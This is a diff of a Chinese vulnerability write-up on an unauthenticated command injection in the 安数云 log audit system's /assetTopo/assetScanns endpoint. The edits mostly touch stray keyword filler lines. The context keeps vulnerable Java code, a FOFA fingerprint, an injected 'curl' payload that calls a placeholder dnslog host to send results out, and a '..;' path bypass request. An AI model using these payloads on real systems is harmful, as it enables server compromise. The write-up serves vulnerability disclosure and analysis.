@@ -8,7 +8,7 @@ asset_dir: embedded-base64
 
 安数云日志审计系统是安数云公司自主研发的专业日志安全审计产品。该系统可以实时监视网络中的各种操作行为和攻击信息，通过事件监控模块监控网络设备、主机系统等的日志信息，及时发现正在发生和已经发生的安全事件，并通过响应模块采取措施，确保网络和业务系统的安全。安数云综合日志分析系统的 /assetTopo/assetScanns 接口存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可以利用该漏洞在服务器端执行任意命令，写入后门，获取服务器权限，进而控制整个web服务器。
 
-漏洞扫描服务
+计算机安全
 
 # 影响版本
 
@@ -19,14 +19,6 @@ asset_dir: embedded-base64
 > (icon\_hash="829311222" || icon\_hash="-2008445303") && (is\_honeypot=false && is\_fraud=false)
 
 # 漏洞分析
-
-深入探索
-
-服务器安全加固服务
-
-加密U盘
-
-Windows安全工具
 
 漏洞触发位置在`com.datacloudsec.web.asset.controller.AssetTopoController`中,看下有关**assetScanns**的处理逻辑
 
@@ -69,14 +61,6 @@ public boolean assetScann(String fileSrc, String ip, String port) {
   }
 ```
 
-深入探索
-
-Web安全工具包
-
-漏洞利用分析
-
-渗透测试报告
-
 如果参数**port不为空或者null**这在拼接在`command`中 `-sV -p port`，然后再将`ip`拼接在后面，最后进入**getScannXmlFile**方法中
 
 ```
@@ -89,7 +73,7 @@ private boolean getScannXmlFile(String nmapDir, String command, String fileSrc) 
 
 调用**CmdKit.execute**执行上面拼接的命令
 
-安全运维服务
+计算机服务器
 
 ```
 public static boolean execute(String cmd) {
@@ -140,7 +124,7 @@ public static boolean execute(String cmd) {
 
 该系统还存在几处需要adm权限（登录后）的[命令注入](https://mrxn.net/tag/rce)点，由于需要权限，暂不赘述。
 
-计算机服务器
+网络安全
 
 # 漏洞复现
 
@@ -155,8 +139,6 @@ ip=127.0.0.1;curl xxx.xx.xxx.dnslog.pt;&port=80
 ```
 
 [命令执行](https://mrxn.net/tag/rce)结果外带
-
-漏洞扫描服务
 
 ```
 POST /js/..;/assetTopo/assetScanns HTTP/1.1
